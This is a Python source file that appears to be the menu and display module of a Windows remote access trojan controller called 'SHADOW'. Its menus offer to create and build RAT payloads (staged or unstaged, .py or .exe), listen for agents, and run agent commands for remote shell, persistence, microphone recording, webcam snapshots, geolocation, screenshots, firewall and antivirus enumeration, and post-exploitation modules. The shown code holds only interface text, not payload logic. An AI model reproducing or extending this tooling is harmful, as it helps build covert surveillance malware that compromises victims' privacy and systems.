from colorama import Fore, init, Style

class options():
    slot = ["DATA INPUT", "IP INPUT", "PORT INPUT", "AGENT IP: ", "AGENT PORT: ", "GENERATE", "APP",
             "APP LOCATION", "STAGE MODE", "NOTIFICATION TITLE",
               "NOTIFICATION TEXT", "NOTIFICATION APP", "NOTIFICATION", "POST EXPLOIT", "CONTROLLER", "MODULE SELECTION", "SELECTION"]
    agent_options = f"""\n
            1   -   Remote Shell
            2   -   Create Persistence
            3   -   Record Microphone
            4   -   Upload File
            5   -   Webcam Snapshot
            6   -   Get Location
            7   -   Remove Persistence
            8   -   System Info
            9   -   Send Notification
            10  -   Get Screenshot
            11  -   Security Info
            12  -   Manage Post Exploits
            q   -   Quit
            """
    
    createMenu_options3 = f"""\n
            1   -   Run App Template
            2   -   Not Run App Template
            9   -   Back Menu
            """

    createMenu_options2 = f"""\n
            1   -   Windows/Staged
            2   -   Windows/UnStaged
            9   -   Back Menu
            """ 
    
    createMenu_options1 = f"""\n
            1   -   Python File (.py)
            2   -   Executable Format (.exe) 
            9   -   Back Menu
            """
    notification_options = f"""\n
            1   -   Set Title
            2   -   Set Message
            3   -   Set App Name
            4   -   Send
            9   -   Back
            """
    
    build_formats = {'1':'py', '2':'exe'}

    def getMenuOptions(ip, port):
        return f"""\n
            1   -   Create RAT
            2   -   Listen
            3   -   Select IP ({ip})
            4   -   Select PORT ({port})
            5   -   Generate Conf
            q   -   Quit
            """
    def printSecurityInfoText(data):
        print(f'''{Style.BRIGHT}{Fore.GREEN}            
| SECURITY INFO |
              
{Fore.MAGENTA}{Style.BRIGHT}---FIREWALL---''')
        
        firewall_data = data["Firewall"]

        for f in firewall_data:
            print(f'''
{Fore.LIGHTBLUE_EX}displayName: {Fore.LIGHTCYAN_EX}{f["displayName"]} 
{Fore.LIGHTBLUE_EX}instanceGuid: {Fore.LIGHTCYAN_EX}{f["instanceGuid"]} 
{Fore.LIGHTBLUE_EX}pathToSignedProductExe: {Fore.LIGHTCYAN_EX}{f["pathToSignedProductExe"]} 
{Fore.LIGHTBLUE_EX}pathToSignedReportingExe: {Fore.LIGHTCYAN_EX}{f["pathToSignedReportingExe"]} 
{Fore.LIGHTBLUE_EX}productState: {Fore.LIGHTCYAN_EX}{f["productState"]} 
{Fore.LIGHTBLUE_EX}timestamp: {Fore.LIGHTCYAN_EX}{f["timestamp"]}''')
            
        print(f'''{Fore.MAGENTA}{Style.BRIGHT}

---ANTIVIRUS---''')
        av_data = data["Antivirus"]

        for f in av_data:
            print(f'''
{Fore.LIGHTBLUE_EX}displayName: {Fore.LIGHTCYAN_EX}{f["displayName"]} 
{Fore.LIGHTBLUE_EX}instanceGuid: {Fore.LIGHTCYAN_EX}{f["instanceGuid"]} 
{Fore.LIGHTBLUE_EX}pathToSignedProductExe: {Fore.LIGHTCYAN_EX}{f["pathToSignedProductExe"]} 
{Fore.LIGHTBLUE_EX}pathToSignedReportingExe: {Fore.LIGHTCYAN_EX}{f["pathToSignedReportingExe"]} 
{Fore.LIGHTBLUE_EX}productState: {Fore.LIGHTCYAN_EX}{f["productState"]} 
{Fore.LIGHTBLUE_EX}timestamp: {Fore.LIGHTCYAN_EX}{f["timestamp"]}''')
        
    def getSystemInfoText(data):
        display_data = data

        text = f'''{Style.BRIGHT}{Fore.GREEN} 
| SYSTEM INFO |{Style.NORMAL}
{Fore.LIGHTBLUE_EX}Platform:{Fore.LIGHTCYAN_EX} {display_data["Platform"]}
{Fore.LIGHTBLUE_EX}Platform Release:{Fore.LIGHTCYAN_EX} {display_data["Platform Release"]}
{Fore.LIGHTBLUE_EX}Platform Version:{Fore.LIGHTCYAN_EX} {display_data["Platform Version"]}
{Fore.LIGHTBLUE_EX}Architecture:{Fore.LIGHTCYAN_EX} {display_data["Architecture"]}
{Fore.LIGHTBLUE_EX}Hostname:{Fore.LIGHTCYAN_EX} {display_data["Hostname"]}
{Fore.LIGHTBLUE_EX}IP Address:{Fore.LIGHTCYAN_EX} {display_data["IP Address"]}
{Fore.LIGHTBLUE_EX}Processor:{Fore.LIGHTCYAN_EX} {display_data["Processor"]}
{Fore.LIGHTBLUE_EX}Python Build:{Fore.LIGHTCYAN_EX} {display_data["Python Build"]}
{Fore.LIGHTBLUE_EX}Python Version:{Fore.LIGHTCYAN_EX} {display_data["Python Version"]}
'''
        return text
    def getInputText(mode, port=0, ip=""):
        SLOT1 = Fore.CYAN
        SLOT2 = Fore.CYAN
        # DEFAULT
        if mode == 0:
            SLOT1 += options.slot[6]
            SLOT2 += "NONE"
        # IP INPUT
        elif mode == 1:
            SLOT1 += options.slot[0]
            SLOT2 += options.slot[1]
        # PORT INPUT
        elif mode == 2:
            SLOT1 += options.slot[0]
            SLOT2 += options.slot[2]
        # GENERATE PAYLOAD
        elif mode == 3:
            SLOT1 += options.slot[6]
            SLOT2 += options.slot[5]
        # CONNECTION INFO(IP, PORT)
        elif mode == 4:
            SLOT1 += options.slot[3] + Fore.GREEN + str(port)
            SLOT2 += options.slot[4] + Fore.GREEN + str(ip)
        # APP LOCATION INPUT
        elif mode == 5:
            SLOT1 += options.slot[0]
            SLOT2 += options.slot[7]
        # STAGE MODE SELECTION
        elif mode == 6:
            SLOT1 += options.slot[0]
            SLOT2 += options.slot[8]
        # NOTIFICATION TITLE INPUT
        elif mode == 7:
            SLOT1 += options.slot[0]
            SLOT2 += options.slot[9]
        # NOTIFICATION TEXT INPUT
        elif mode == 8:
            SLOT1 += options.slot[0]
            SLOT2 += options.slot[10]
        # NOTIFICATION APP NAME INPUT
        elif mode == 9:
            SLOT1 += options.slot[0]
            SLOT2 += options.slot[11]
        # NOTIFICATION SEND MENU
        elif mode == 10:
            SLOT1 += options.slot[0]
            SLOT2 += options.slot[12]
        # POST EXPLOIT MENU
        elif mode == 11:
            SLOT1 += options.slot[6]
            SLOT2 += options.slot[13]
        # POST EXPLOIT CONTROLLER
        elif mode == 12:
            SLOT1 += options.slot[13]
            SLOT2 += options.slot[14]
        # POST EXPLOIT MODULE SELECTION
        elif mode == 13:
            SLOT1 += options.slot[13]
            SLOT2 += options.slot[15]
        # POST EXPLOIT ACTION SELECTION
        elif mode == 14:
            SLOT1 += options.slot[13]
            SLOT2 += options.slot[16]

        SHADOW  = f"{Fore.MAGENTA}{Style.BRIGHT}SHADOW"
        DIVIDER = f"{Fore.WHITE}│"
        AGENTS  = f"{Fore.CYAN}AGENTS:{Fore.GREEN}{1}"
        SESS    = f"{Fore.CYAN}SESS:{Fore.YELLOW}{'127.0.0.1'}"
        BRACKET_L = f"{Fore.WHITE}["
        BRACKET_R = f"{Fore.WHITE}]"
        POINTER = f"{Fore.MAGENTA}➤{Fore.RESET}"

        prompt_str = (
                f"{BRACKET_L}{SHADOW} {DIVIDER} {SLOT1} {DIVIDER} {SLOT2}{BRACKET_R} {POINTER}  "
        )
        
        return prompt_str